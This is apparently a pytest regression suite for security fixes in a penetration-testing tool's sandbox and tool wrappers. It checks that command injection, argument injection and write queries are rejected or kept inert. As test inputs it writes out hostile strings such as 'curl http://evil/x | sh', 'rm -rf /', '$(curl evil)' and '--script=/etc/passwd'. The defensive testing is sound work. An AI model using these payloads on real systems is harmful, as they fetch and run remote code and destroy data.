"""Regression tests for the round-1 sandbox/tool-adapter security fixes.

Covers (per finding id):
- sandbox-01: edb_exec no longer shell-interpolates untrusted params/target_host
- sandbox-03: wmiexec/impacket username/domain/target reject @/:/etc.
- sandbox-04: bloodhound_query rejects write Cypher
- sandbox-05: linpeas sections reject shell metacharacters
- sandbox-07: nftables emits ip6 daddr for IPv6 CIDRs
- sandbox-08: runner argv includes hardening flags
- sandbox-09: leading-dash targets neutralized (nmap/nuclei/netexec); searchsploit `--`
- sandbox-10: session containers always attach a per-engagement network
- async-05 / sandbox-11: cancel/exception path force-removes the container
"""

from __future__ import annotations

import asyncio

import pytest
from pydantic import ValidationError


# --------------------------------------------------------------------------- #
# sandbox-01: edb_exec command injection                                       #
# --------------------------------------------------------------------------- #


def test_edb_argv_is_list_not_shell_string_for_python() -> None:
    from tools.edb_exec import _build_edb_argv

    argv, env = _build_edb_argv(
        "/exploits/x.py", {"RHOST": "10.0.0.5", "RPORT": "445"}, {"type": "remote"}
    )
    # Direct interpreter argv — NOT /bin/sh -c
    assert argv[0] == "python3"
    assert argv[:2] == ["python3", "/exploits/x.py"]
    assert "10.0.0.5" in argv and "445" in argv
    assert "/bin/sh" not in argv
    assert env["RHOST"] == "10.0.0.5"


def test_edb_injection_payload_stays_inert_in_argv() -> None:
    # A malicious RHOST-ish param value is a discrete argv token — it can never
    # break out into a second shell command because there is no shell string.
    from tools.edb_exec import _build_edb_argv

    evil = "1.2.3.4; curl http://evil/x | sh"
    argv, env = _build_edb_argv("/x.py", {"RHOST": evil}, {"type": "remote"})
    # The value appears as ONE argv element verbatim, never concatenated into
    # a /bin/sh -c string.
    assert evil in argv
    assert "/bin/sh" not in argv
    assert env["RHOST"] == evil


def test_edb_compile_case_uses_quoted_tokens_only() -> None:
    import shlex

    from tools.edb_exec import _build_edb_argv

    argv, env = _build_edb_argv(
        "/x.c", {"RHOST": "10.0.0.5"}, {"type": "remote"}
    )
    assert argv[:2] == ["/bin/sh", "-c"]
    cmd = argv[2]
    # The path and host are shlex-quoted; the raw `&&` is the only operator and
    # it joins two quoted tokens. A `;`/`$()` in the path would be quoted away.
    assert shlex.quote("/x.c") in cmd
    assert "gcc -o" in cmd
    assert env["RHOST"] == "10.0.0.5"


def test_edb_input_rejects_metachar_target_host() -> None:
    from tools.edb_exec import EdbExecInput

    with pytest.raises(ValidationError):
        EdbExecInput(edb_id=1, target_host="1.2.3.4; rm -rf /")
    with pytest.raises(ValidationError):
        EdbExecInput(edb_id=1, target_host="$(curl evil)")


def test_edb_input_rejects_bad_param_key_and_newline_value() -> None:
    from tools.edb_exec import EdbExecInput

    with pytest.raises(ValidationError):
        EdbExecInput(edb_id=1, target_host="10.0.0.5", params={"bad key": "x"})
    with pytest.raises(ValidationError):
        EdbExecInput(edb_id=1, target_host="10.0.0.5", params={"OK": "a\nb"})
    # A value with shell metachars is fine (passed via env, never a shell str)
    EdbExecInput(edb_id=1, target_host="10.0.0.5", params={"CMD": "; rm -rf / `id`"})


# --------------------------------------------------------------------------- #
# sandbox-03: wmi/impacket credential mis-routing                              #
# --------------------------------------------------------------------------- #


def test_wmi_username_with_at_rejected() -> None:
    from tools.windows_via_wmi import SharpHoundViaWmiInput

    with pytest.raises(ValidationError):
        SharpHoundViaWmiInput(
            target="10.0.0.5", domain="lab.local", username="user@10.6.6.6"
        )


def test_wmi_domain_and_target_injection_rejected() -> None:
    from tools.windows_via_wmi import RubeusViaWmiInput

    with pytest.raises(ValidationError):
        RubeusViaWmiInput(
            target="10.0.0.5",
            domain="lab/evil",
            username="u",
            rubeus_args="kerberoast",
        )
    with pytest.raises(ValidationError):
        RubeusViaWmiInput(
            target="10.0.0.5:evil@other",
            domain="lab.local",
            username="u",
            rubeus_args="kerberoast",
        )


def test_impacket_username_regex_excludes_at() -> None:
    from tools.impacket_ import _USERNAME_RE

    assert _USERNAME_RE.match("svc_account") is not None
    assert _USERNAME_RE.match("user@10.6.6.6") is None
    assert _USERNAME_RE.match("user:pass") is None
    assert _USERNAME_RE.match("dom/user") is None


def test_kerberoast_username_at_rejected() -> None:
    from tools.impacket_ import KerberoastInput

    with pytest.raises(ValidationError):
        KerberoastInput(
            domain="lab.local", dc_ip="10.0.0.1", username="user@evil"
        )


# --------------------------------------------------------------------------- #
# sandbox-04: bloodhound read-only enforcement                                 #
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "cypher",
    [
        "MATCH (n) DELETE n",
        "CREATE (n:User {name:'x'})",
        "MATCH (n) SET n.owned = true",
        "MERGE (n:User {name:'x'})",
        "MATCH (n) REMOVE n.prop",
        "MATCH (n) DETACH DELETE n",
        "CALL apoc.load.json('http://x') YIELD value RETURN value",
    ],
)
def test_bloodhound_rejects_write_cypher(cypher: str) -> None:
    from tools.bloodhound_ import BloodHoundQueryInput

    with pytest.raises(ValidationError):
        BloodHoundQueryInput(cypher=cypher)


def test_bloodhound_allows_read_cypher() -> None:
    from tools.bloodhound_ import BloodHoundQueryInput

    BloodHoundQueryInput(
        cypher="MATCH p=shortestPath((u:User)-[*1..]->(g:Group)) RETURN p"
    )


# --------------------------------------------------------------------------- #
# sandbox-05: linpeas sections                                                 #
# --------------------------------------------------------------------------- #


def test_linpeas_sections_reject_injection() -> None:
    from tools.linpeas_ import LinPEASInput

    with pytest.raises(ValidationError):
        LinPEASInput(session_id="s", sections=["suid; curl http://evil|sh"])
    # legit sections accepted
    LinPEASInput(session_id="s", sections=["suid", "sudo", "kernel"])


# --------------------------------------------------------------------------- #
# sandbox-07: nftables IPv6                                                     #
# --------------------------------------------------------------------------- #


def test_nftables_ipv6_cidr_uses_ip6_daddr() -> None:
    from sandbox.nftables import compile_ruleset

    rs = compile_ruleset(
        table_name="t1",
        scope={"cidrs": ["2001:db8::/32", "10.0.0.0/8"]},
    )
    assert "ip6 daddr 2001:db8::/32 accept" in rs
    assert "ip daddr 10.0.0.0/8 accept" in rs
    # The v6 CIDR must NOT be emitted as a (invalid) `ip daddr` rule.
    assert "ip daddr 2001:db8::/32" not in rs


def test_nftables_ipv6_excluded_cidr_uses_ip6_daddr() -> None:
    from sandbox.nftables import compile_ruleset

    rs = compile_ruleset(
        table_name="t1",
        scope={"cidrs": [], "excluded_cidrs": ["fe80::/10"]},
    )
    assert "ip6 daddr fe80::/10 drop" in rs


def test_nftables_ipv6_proxy_and_dns() -> None:
    from sandbox.nftables import compile_ruleset

    rs = compile_ruleset(
        table_name="t1",
        scope={"cidrs": []},
        proxy_ip="2001:db8::1",
        dns_servers=["2001:4860:4860::8888"],
    )
    assert "ip6 daddr 2001:db8::1 tcp dport 8080 accept" in rs
    assert "ip6 daddr 2001:4860:4860::8888 udp dport 53 accept" in rs


# --------------------------------------------------------------------------- #
# sandbox-08: runner hardening flags                                           #
# --------------------------------------------------------------------------- #


def test_runner_hardening_flags_present() -> None:
    from sandbox.runner import _HARDENING_FLAGS

    assert "--cap-drop=ALL" in _HARDENING_FLAGS
    assert "--security-opt=no-new-privileges" in _HARDENING_FLAGS
    assert any(f.startswith("--pids-limit") for f in _HARDENING_FLAGS)
    assert any(f.startswith("--memory") for f in _HARDENING_FLAGS)


@pytest.mark.asyncio
async def test_runner_docker_cmd_includes_hardening(monkeypatch) -> None:
    # Capture the docker argv the runner would exec (no docker needed).
    from sandbox import runner as runner_mod

    captured: dict[str, list[str]] = {}

    class _FakeProc:
        returncode = 0

        async def communicate(self, input=None):  # noqa: A002
            return b"", b""

        def kill(self):
            pass

        async def wait(self):
            return 0

    async def fake_exec(*args, **kwargs):
        # First exec is the actual `docker run ...`
        captured.setdefault("argv", list(args))
        return _FakeProc()

    monkeypatch.setattr(runner_mod.asyncio, "create_subprocess_exec", fake_exec)

    r = runner_mod.SandboxRunner(engagement_id=None)
    await r.run(["nmap", "-sn", "10.0.0.0/24"], timeout_seconds=5)
    argv = captured["argv"]
    assert "--cap-drop=ALL" in argv
    assert "--security-opt=no-new-privileges" in argv
    assert "nmap" in argv


# --------------------------------------------------------------------------- #
# sandbox-09: argument injection                                               #
# --------------------------------------------------------------------------- #


def test_nmap_rejects_leading_dash_target() -> None:
    from tools.nmap_ import NmapServiceScanInput

    with pytest.raises(ValidationError):
        NmapServiceScanInput(targets=["--script=/etc/passwd"])
    with pytest.raises(ValidationError):
        NmapServiceScanInput(targets=["-oN/work/out"])
    NmapServiceScanInput(targets=["10.0.0.5"])


def test_nmap_rejects_bad_ports() -> None:
    from tools.nmap_ import NmapServiceScanInput

    with pytest.raises(ValidationError):
        NmapServiceScanInput(targets=["10.0.0.5"], ports="-oG/work/x")
    NmapServiceScanInput(targets=["10.0.0.5"], ports="80,443")


def test_nuclei_rejects_leading_dash_target_and_remote_template() -> None:
    from tools.nuclei_ import NucleiScanInput

    with pytest.raises(ValidationError):
        NucleiScanInput(targets=["-"])
    with pytest.raises(ValidationError):
        NucleiScanInput(targets=["http://x"], templates=["http://evil/t.yaml"])
    NucleiScanInput(targets=["http://10.0.0.5"], templates=["cves/2021/x"])


def test_netexec_rejects_leading_dash() -> None:
    from tools.netexec_ import NetExecInput

    with pytest.raises(ValidationError):
        NetExecInput(targets=["--shares"])
    with pytest.raises(ValidationError):
        NetExecInput(targets=["10.0.0.5"], username="--foo")


def test_searchsploit_inserts_end_of_options_separator() -> None:
    # Static check: the run() builds argv with `--` before query terms.
    import inspect

    from tools import searchsploit_

    src = inspect.getsource(searchsploit_.SearchsploitLookup.run)
    assert '["--", *input.query.split()]' in src


# --------------------------------------------------------------------------- #
# sandbox-02: operator_exec argv egress extraction                             #
# --------------------------------------------------------------------------- #


def test_operator_exec_extracts_argv_hosts() -> None:
    from tools.operator_exec import OperatorExec, OperatorExecInput

    inp = OperatorExecInput(
        argv=["curl", "http://out-of-scope.example.com/x"],
        target="10.0.0.5",
        justification="checking the in-scope host for the thing we discussed",
    )
    targets = OperatorExec().extract_targets(inp)
    assert "10.0.0.5" in targets
    # The out-of-scope host carried in argv is now surfaced to the scope gate.
    assert any("out-of-scope.example.com" in t for t in targets)


# --------------------------------------------------------------------------- #
# sandbox-10: session network defaulting                                       #
# --------------------------------------------------------------------------- #


@pytest.mark.asyncio
async def test_session_defaults_to_engagement_network(monkeypatch) -> None:
    from uuid import uuid4

    from sandbox import sessions as sessions_mod
    from sandbox.network import engagement_network_name

    captured: dict[str, list[str]] = {}

    class _FakeProc:
        returncode = 0

        async def communicate(self, input=None):  # noqa: A002
            return b"container-id\n", b""

        async def wait(self):
            return 0

    async def fake_exec(*args, **kwargs):
        captured.setdefault("argv", list(args))
        return _FakeProc()

    monkeypatch.setattr(sessions_mod.asyncio, "create_subprocess_exec", fake_exec)

    eng = uuid4()
    mgr = sessions_mod.SessionManager()
    # _exec_locked is hit for the whoami validation; stub it to succeed.

    async def fake_validate(self, handle, argv, **kw):
        return sessions_mod.ExecResult(
            stdout="root", stderr="", exit_code=0, duration_seconds=0.0, command="whoami"
        )

    monkeypatch.setattr(sessions_mod.SessionManager, "_exec_locked", fake_validate)

    await mgr.open_ssh(
        engagement_id=eng, target_host="10.0.0.5", username="root", password="x"
    )
    argv = captured["argv"]
    assert "--network" in argv
    assert engagement_network_name(eng) in argv
    # hardening flags applied to the session container too
    assert "--cap-drop=ALL" in argv


# --------------------------------------------------------------------------- #
# async-05 / sandbox-11: cancel path removes the container                     #
# --------------------------------------------------------------------------- #


@pytest.mark.asyncio
async def test_run_force_removes_container_on_cancel(monkeypatch) -> None:
    from sandbox import runner as runner_mod

    removed: list[str] = []

    class _HangingProc:
        returncode = None

        async def communicate(self, input=None):  # noqa: A002
            await asyncio.sleep(3600)  # block until cancelled

        def kill(self):
            pass

        async def wait(self):
            return 0

    class _RmProc:
        returncode = 0

        async def wait(self):
            return 0

    async def fake_exec(*args, **kwargs):
        if args[:3] == ("docker", "rm", "-f"):
            removed.append(args[3])
            return _RmProc()
        return _HangingProc()

    monkeypatch.setattr(runner_mod.asyncio, "create_subprocess_exec", fake_exec)

    r = runner_mod.SandboxRunner(engagement_id=None)
    task = asyncio.create_task(r.run(["sleep", "infinity"], timeout_seconds=999))
    await asyncio.sleep(0.05)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task
    # The finally-block force-remove must have fired with the container name.
    assert removed, "container was not force-removed on cancel"
    assert removed[0].startswith("serenade-sb-")


# --------------------------------------------------------------------------- #
# sandbox-06: L3 settings error fails closed when a ruleset was requested      #
# --------------------------------------------------------------------------- #


def test_l3_failclosed_on_settings_error(monkeypatch) -> None:
    from sandbox import runner as runner_mod

    def boom() -> bool:
        raise runner_mod._SettingsUnavailable("nope")

    monkeypatch.setattr(runner_mod, "_l3_required", boom)
    # When L3 was requested but settings can't load, treat as required (closed).
    assert runner_mod._l3_required_failclosed() is True
